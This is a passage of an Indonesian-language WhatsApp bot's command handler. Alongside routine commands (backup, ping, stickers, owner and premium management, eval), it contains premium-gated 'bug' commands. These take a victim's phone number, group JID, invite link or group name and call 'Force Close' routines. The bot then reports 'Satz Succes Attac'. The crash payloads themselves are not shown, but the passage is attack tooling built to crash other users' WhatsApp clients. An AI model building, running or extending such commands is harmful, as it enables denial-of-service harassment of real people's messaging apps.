              message: "👁‍🗨⃟꙰ 𝐍𝐈𝐆𝐇𝐓𝟕 ─ 𝐒𝐀𝐓𝐙 ⌁",
              token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
            }
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          }
        }
      }
    );
}
break;
                
                case "xzdfre": {
  if (!isPremium && !isCreator)
    return m.reply(msg.premium);

  const phone = args[0]
    ? args[0].replace(/[^0-9]/g, "")
    : null;

  if (!phone)
    return await conn.sendMessage(m.chat,{
        richMessage: {
        title: "Error!!",
        code: {
        language: "javascript",
        code: ""
        },
        productSingle: {
      title: "BASE WHATSAP",
      brand: "Satz",
      price: "Rp999999999",
      sale_price: "999999",
      product_url: "https://t.me/mynamesatzera",
      image: "https://files.catbox.moe/ld1a18.jpg",
      additional_images: [
        {
          url: "https://files.catbox.moe/ld1a18.jpg"
        }
      ]
    },
            suggestions: [
                "contoh =>",
                "invis 62887887",
                ]
    }
        })

  const target = phone + "@s.whatsapp.net";

  // =========================================
  // MESSAGE 1
  // =========================================

  await conn.sendMessage(m.chat,{
      richMessage: {
        title: "Satz Succes Attac",
        table: [
        ["Type", "Nomor", "Status"],
        ["Force Close",target,"Processing"]
        ],
        code: {
        language: "javascript",
        code: ` const status = {
        "Status": "Processing Sending",
        "Target": ${target}
        }`
        },
        
        productSingle: {
      title: "BASE WHATSAP",
      brand: "Satz",
      price: "Rp999999999",
      sale_price: "999999",
      product_url: "https://t.me/mynamesatzera",
      image: "https://files.catbox.moe/ld1a18.jpg",
      additional_images: [
        {
          url: "https://files.catbox.moe/ld1a18.jpg"
        }
      ]
    },
        contextInfo: {
        quotedMessage: {
            orderMessage: {
              orderId: "2009",
              thumbnail: null,
              itemCount: "991111199",
              status: "INQUIRY",
              surface: "CATALOG",
              message: "Wabotz ─ 𝐒𝐀𝐓𝐙 ⌁",
              token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
            }
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          }
        }
    });
    

  // =========================================
  // SIMULASI PROSES
  // =========================================

  let startTime = Date.now();

  for (let i = 0; i < 1; i++) {
await satz(conn,target);
}
                let endTime = Date.now();
  let elapsedTime =
    ((endTime - startTime) / 1000).toFixed(2);

  console.log(`Process selesai dalam ${elapsedTime}s`);
    // =======================================
    // MESSAGE 2
    // =======================================

    await conn.sendMessage(
      m.chat,
      {
        richMessage: {
        title: "Satz Succes Attac",
        table: [
        ["Type", "Nomor", "Status"],
        ["Force Close", target, "Succes"]
        ],
        code: {
        language: "javascript",
        code: ` const status = {
        "Status": "Succes",
        "Target": ${target}
        }`
        },
        
        productSingle: {
      title: "BASE WHATSAP",
      brand: "Satz",
      price: "Rp999999999",
      sale_price: "999999",
      product_url: "https://t.me/mynamesatzera",
      image: "https://files.catbox.moe/ld1a18.jpg",
      additional_images: [
        {
          url: "https://files.catbox.moe/ld1a18.jpg"
        }
      ]
    },
        contextInfo: {
        quotedMessage: {
            orderMessage: {
              orderId: "2009",
              thumbnail: null,
              itemCount: "991111199",
              status: "INQUIRY",
              surface: "CATALOG",
              message: "👁‍🗨⃟꙰ 𝐍𝐈𝐆𝐇𝐓𝟕 ─ 𝐒𝐀𝐓𝐙 ⌁",
              token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
            }
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          }
        }
      }
    );
}
break;
                
                
                
                ////// CASE BUG IN PLACE
                case "x": {
    if (!isPremium && !isCreator)
        return m.reply(msg.premium);

    const target = m.chat;

    for (let i = 0; i < 3; i++) {
        await fc(conn, target);
    }
}
break;

case "show": {
    if (!isPremium && !isCreator)
        return m.reply(msg.premium);

    const target = m.chat;

    for (let i = 0; i < 3; i++) {
        await fc(conn, target);
    }
}
break;


                
                
                
                //// CASE BUG GROUP
                
                case "xzdgb": {
    if (!isPremium && !isCreator)
        return m.reply(msg.premium);

    try {
        const target = args.join(" ").trim();

        if (!target) {
            return await conn.sendMessage(m.chat,{
                richMessage: {
        title: "Satz Succes Attac",
        productSingle: {
      title: "BASE WHATSAP",
      brand: "Satz",
      price: "Rp999999999",
      sale_price: "999999",
      product_url: "https://t.me/mynamesatzera",
      image: "https://files.catbox.moe/ld1a18.jpg",
      additional_images: [
        {
          url: "https://files.catbox.moe/ld1a18.jpg"
        }
      ]
    },
    suggestions: [
    "gbp <LINK GB>",
    "gbp <Jid Gb>"
    ]
    }
                })
        }

        // =========================================
        // AMBIL DAFTAR GRUP
        // =========================================
        const groupsAll = await conn
            .groupFetchAllParticipating()
            .catch(() => ({}));

        const groups = Object.values(groupsAll).map(g => ({
            id: g.id,
            name: g.subject || "-"
        }));

        if (!groups.length)
            return m.reply("❌ Tidak ada grup yang ditemukan.");

        let groupJid;
        let groupName;

        // =========================================
        // JID GRUP
        // =========================================
        if (/^\d+-\d+@g\.us$/.test(target)) {
            const found = groups.find(g => g.id === target);

            if (!found)
                return m.reply("❌ Grup dengan JID tersebut tidak ditemukan.");

            groupJid = found.id;
            groupName = found.name;
        }

        // =========================================
        // LINK GRUP
        // =========================================
        else if (/chat\.whatsapp\.com\/[A-Za-z0-9_-]{20,24}/i.test(target)) {
            const code = target.match(
                /chat\.whatsapp\.com\/([A-Za-z0-9_-]{20,24})/i
            )?.[1];

            if (!code)
                return m.reply("❌ Link grup tidak valid.");

            const info = await conn
                .groupGetInviteInfo(code)
                .catch(() => null);

            if (!info?.id)
                return m.reply(
                    "❌ Tidak dapat mengambil informasi grup.\n" +
                    "Pastikan sender memiliki akses ke link tersebut."
                );

            groupJid = info.id.endsWith("@g.us")
                ? info.id
                : info.id + "@g.us";

            groupName = info.subject || "-";
        }

        // =========================================
        // NAMA GRUP
        // =========================================
        else {
            const q = target.toLowerCase();

            const found =
                groups.find(g =>
                    g.name.toLowerCase() === q
                ) ||
                groups.find(g =>
                    g.name.toLowerCase().includes(q)
                );

            if (!found)
                return m.reply("❌ Nama grup tidak ditemukan.");

            groupJid = found.id;
            groupName = found.name;
        }

        // =========================================
        // HASIL TARGET
        // =========================================
        await conn.sendMessage(m.chat,{
        richMessage: {
        title: "Satz Succes Attac",
        table: [
        ["Type", "Jid", "Name"],
        ["Force Close", groupJid, groupName]
        ],
        code: {
        language: "javascript",
        code: ` const status = {
        "Status": "Succes",
        "Jid": ${groupJid},
        "Name": ${groupName}
        }`
        },
        
        productSingle: {
      title: "BASE WHATSAP",
      brand: "Satz",
      price: "Rp999999999",
      sale_price: "999999",
      product_url: "https://t.me/mynamesatzera",
      image: "https://files.catbox.moe/ld1a18.jpg",
      additional_images: [
        {
          url: "https://files.catbox.moe/ld1a18.jpg"
        }
      ]
    },
        contextInfo: {
        quotedMessage: {
            orderMessage: {
              orderId: "2009",
              thumbnail: null,
              itemCount: "991111199",
              status: "INQUIRY",
              surface: "CATALOG",
              message: "👁‍🗨⃟꙰ 𝐍𝐈𝐆𝐇𝐓𝟕 ─ 𝐒𝐀𝐓𝐙 ⌁",
              token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
            }
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          }
        }
        })
for (let i = 0; i < 1; i++) {
        await fc(conn,groupJid);
    }
        // =========================================
        // TARUH AKSI GRUP YANG AMAN DI SINI
        // =========================================

    } catch (e) {
        console.error(e);

        return m.reply(
            "❌ Terjadi kesalahan:\n" +
            (e?.message || "Unknown error")
        );
    }
}
break;

case "xzdgbf": {
    if (!isPremium && !isCreator)
        return m.reply(msg.premium);

    try {
        const target = args.join(" ").trim();

        if (!target) {
            return await conn.sendMessage(m.chat,{
                richMessage: {
        title: "Satz Succes Attac",
        productSingle: {
      title: "BASE WHATSAP",
      brand: "Satz",
      price: "Rp999999999",
      sale_price: "999999",
      product_url: "https://t.me/mynamesatzera",
      image: "https://files.catbox.moe/ld1a18.jpg",
      additional_images: [
        {
          url: "https://files.catbox.moe/ld1a18.jpg"
        }
      ]
    },
    suggestions: [
    "gbp <LINK GB>",
    "gbp <Jid Gb>"
    ]
    }
                })
        }

        // =========================================
        // AMBIL DAFTAR GRUP
        // =========================================
        const groupsAll = await conn
            .groupFetchAllParticipating()
            .catch(() => ({}));

        const groups = Object.values(groupsAll).map(g => ({
            id: g.id,
            name: g.subject || "-"
        }));

        if (!groups.length)
            return m.reply("❌ Tidak ada grup yang ditemukan.");

        let groupJid;
        let groupName;

        // =========================================
        // JID GRUP
        // =========================================
        if (/^\d+-\d+@g\.us$/.test(target)) {
            const found = groups.find(g => g.id === target);

            if (!found)
                return m.reply("❌ Grup dengan JID tersebut tidak ditemukan.");

            groupJid = found.id;
            groupName = found.name;
        }

        // =========================================
        // LINK GRUP
        // =========================================
        else if (/chat\.whatsapp\.com\/[A-Za-z0-9_-]{20,24}/i.test(target)) {
            const code = target.match(
                /chat\.whatsapp\.com\/([A-Za-z0-9_-]{20,24})/i
            )?.[1];

            if (!code)
                return m.reply("❌ Link grup tidak valid.");

            const info = await conn
                .groupGetInviteInfo(code)
                .catch(() => null);

            if (!info?.id)
                return m.reply(
                    "❌ Tidak dapat mengambil informasi grup.\n" +
                    "Pastikan sender memiliki akses ke link tersebut."
                );

            groupJid = info.id.endsWith("@g.us")
                ? info.id
                : info.id + "@g.us";

            groupName = info.subject || "-";
        }

        // =========================================
        // NAMA GRUP
        // =========================================
        else {
            const q = target.toLowerCase();

            const found =
                groups.find(g =>
                    g.name.toLowerCase() === q
                ) ||
                groups.find(g =>
                    g.name.toLowerCase().includes(q)
                );

            if (!found)
                return m.reply("❌ Nama grup tidak ditemukan.");

            groupJid = found.id;
            groupName = found.name;
        }

        // =========================================
        // HASIL TARGET
        // =========================================
        await conn.sendMessage(m.chat,{
        richMessage: {
        title: "Satz Succes Attac",
        table: [
        ["Type", "Jid", "Name"],
        ["Force Close", groupJid, groupName]
        ],
        code: {
        language: "javascript",
        code: ` const status = {
        "Status": "Succes",
        "Jid": ${groupJid},
        "Name": ${groupName}
        }`
        },
        
        productSingle: {
      title: "BASE WHATSAP",
      brand: "Satz",
      price: "Rp999999999",
      sale_price: "999999",
      product_url: "https://t.me/mynamesatzera",
      image: "https://files.catbox.moe/ld1a18.jpg",
      additional_images: [
        {
          url: "https://files.catbox.moe/ld1a18.jpg"
        }
      ]
    },
        contextInfo: {
        quotedMessage: {
            orderMessage: {
              orderId: "2009",
              thumbnail: null,
              itemCount: "991111199",
              status: "INQUIRY",
              surface: "CATALOG",
              message: "👁‍🗨⃟꙰ 𝐍𝐈𝐆𝐇𝐓𝟕 ─ 𝐒𝐀𝐓𝐙 ⌁",
              token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
            }
          },
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          }
        }
        })
for (let i = 0; i < 1; i++) {
        await fc(conn,groupJid);
    }
        // =========================================
        // TARUH AKSI GRUP YANG AMAN DI SINI
        // =========================================

    } catch (e) {
        console.error(e);

        return m.reply(
            "❌ Terjadi kesalahan:\n" +
            (e?.message || "Unknown error")
        );
    }
}
break;


                // CASE MD
                case 'backup': {
    if (!isOwner(m)) return m.reply('Fitur khusus owner!')

    const fs = require('fs')
    const path = require('path')
    const { exec } = require('child_process')

    const folder = path.join(__dirname)
    const filename = `Backup-${Date.now()}.zip`

    m.reply('⏳ Sedang membuat backup...')

    exec(`zip -r "${filename}" . -x "node_modules/*" ".git/*" "*.zip"`, async (err) => {
        if (err) {
            console.log(err)
            return m.reply('❌ Gagal membuat backup.')
        }

        await conn.sendMessage(m.chat, {
            document: fs.readFileSync(filename),
            mimetype: 'application/zip',
            fileName: filename,
            caption: `✅ Backup script berhasil dibuat.`
        }, { quoted: m })

        fs.unlinkSync(filename)
    })
}
break
                


            case 'owner':
            case 'cekowner': {
                const creator = isCreator(m);
                const owner = isOwner(m);
                const status = creator ? '👑 Kamu adalah CREATOR' : owner ? '✅ Kamu adalah OWNER' : '❌ Kamu bukan owner';
                const info = `JID mu: ${m.sender}\nCreator: ${config.ownerNumber}@s.whatsapp.net`;
                await reply(`${status}\n\n${info}`);
                break;
            }

            case 'myjid':
                await reply(`JID kamu: ${m.sender}`);
                break;

            case 'ping': {
                const start = Date.now();
                const sent = await reply('Mengukur ping...');
                const latency = Date.now() - start;
                const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
                const freeMem = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
                const uptimeHours = (os.uptime() / 3600).toFixed(2);
                const cpuModel = os.cpus()[0]?.model || 'Unknown';
                const cpuCores = os.cpus().length;
                const vpsText = `DATA VPS\n- Hostname: ${os.hostname()}\n- Platform: ${os.platform()} ${os.arch()}\n- Uptime: ${uptimeHours} jam\n- RAM: ${freeMem} GB / ${totalMem} GB (Free/Total)\n- CPU: ${cpuCores} Core, ${cpuModel.substring(0, 30)}`;
                await conn.sendMessage(m.chat, { text: `Pong! ${latency} ms\n\n${vpsText}`, edit: sent.key });
                break;
            }

            case 'info': {  
                await reply(`INFO PESAN\n\nJID Pengirim: ${m.sender}\nJID Chat: ${m.chat}\nGrup: ${m.isGroup ? 'Ya' : 'Tidak'}\nDari Bot: ${m.fromMe ? 'Ya' : 'Tidak'}\nID Pesan: ${m.id || '-'}\nTeks: ${m.text || '-'}`);
                break;
            }

            case 'sticker':
            case 's': {
                if (!m.quoted && !args[0]) return reply('Reply gambar/video atau kirim URL dengan .sticker <url>');
                let mediaBuffer;
                if (m.quoted && (m.quoted.mtype === 'imageMessage' || m.quoted.mtype === 'videoMessage')) {
                    mediaBuffer = await m.quoted.download();
                } else if (args[0] && args[0].match(/https?:\/\//)) {
                    const res = await fetch(args[0]);
                    mediaBuffer = Buffer.from(await res.arrayBuffer());
                } else return reply('Format tidak dikenal. Reply media atau kirim URL.');
                if (!mediaBuffer) return reply('Gagal mengambil media.');
                const type = await fileTypeFromBuffer(mediaBuffer);
                if (!type || (!/image/.test(type.mime) && !/video/.test(type.mime))) return reply('Hanya gambar atau video yang didukung.');
                await reply('Membuat stiker...');
                try {
                    const stickerBuffer = await writeExif(mediaBuffer, { packname: 'Sticker Bot', author: 'Night7', cropToSquare: false });
                    await conn.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });
                } catch (err) {
                    console.error(err);
                    await reply('Gagal membuat stiker: ' + err.message);
                }
                break;
            }

            case 'addowner': {
                if (!isCreator(m)) return reply('Khusus creator');
                let target = args[0];
                if (m.mentionedJid?.[0]) target = m.mentionedJid[0];
                if (!target) return reply('Contoh: .addowner 628xxx');
                const ownerDB = readJSON(ownerPath);
                const num = getNumber(target);
                if (ownerDB.includes(num)) return reply('Sudah jadi owner');
                ownerDB.push(num);
                saveJSON(ownerPath, ownerDB);
                reply(`Berhasil add owner\n${num}`);
                break;
            }

            case 'delowner': {
                if (!isCreator(m)) return reply('Khusus creator');
                let target = args[0];
                if (m.mentionedJid?.[0]) target = m.mentionedJid[0];
                if (!target) return reply('Contoh: .delowner 628xxx');
                const ownerDB = readJSON(ownerPath);
                const num = getNumber(target);
                const filtered = ownerDB.filter(v => v !== num);
                saveJSON(ownerPath, filtered);
                reply(`Berhasil del owner\n${num}`);
                break;
            }

            case 'addprem': {
                if (!isOwner(m)) return reply('Khusus owner');
                let target = args[0];
                if (m.mentionedJid?.[0]) target = m.mentionedJid[0];
                if (!target) return reply('Contoh: .addprem 628xxx');
                const premiumDB = readJSON(premiumPath);
                const num = getNumber(target);
                if (premiumDB.includes(num)) return reply('Sudah premium');
                premiumDB.push(num);
                saveJSON(premiumPath, premiumDB);
                reply(`Berhasil add premium\n${num}`);
                break;
            }

            case 'delprem': {
                if (!isOwner(m)) return reply('Khusus owner');
                let target = args[0];
                if (m.mentionedJid?.[0]) target = m.mentionedJid[0];
                if (!target) return reply('Contoh: .delprem 628xxx');
                const premiumDB = readJSON(premiumPath);
                const num = getNumber(target);
                const filtered = premiumDB.filter(v => v !== num);
                saveJSON(premiumPath, filtered);
                reply(`Berhasil del premium\n${num}`);
                break;
            }

            case 'eval': {
                if (!isCreator(m)) return reply('Khusus creator');
                const code = args.join(' ');
                if (!code) return reply('Contoh:\n.eval 1+1');
                await executeEval(code, conn, m);
                break;
            }
            
           case 'public': {
    if (!isOwner(m)) return reply('Khusus owner')

    config.mode = 'public'
    fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))

    reply('Berhasil ganti mode ke public')
}
           break

           case 'self': {
    if (!isOwner(m)) return reply('Khusus owner')

    config.mode = 'self'
    fs.writeFileSync('./config.json', JSON.stringify(config, null, 2))

    reply('Berhasil ganti mode ke self')
}
           break
           
           
            default:
                break;
        }
    } catch (err) {
        console.error('Error in command handler:', err);
    }
};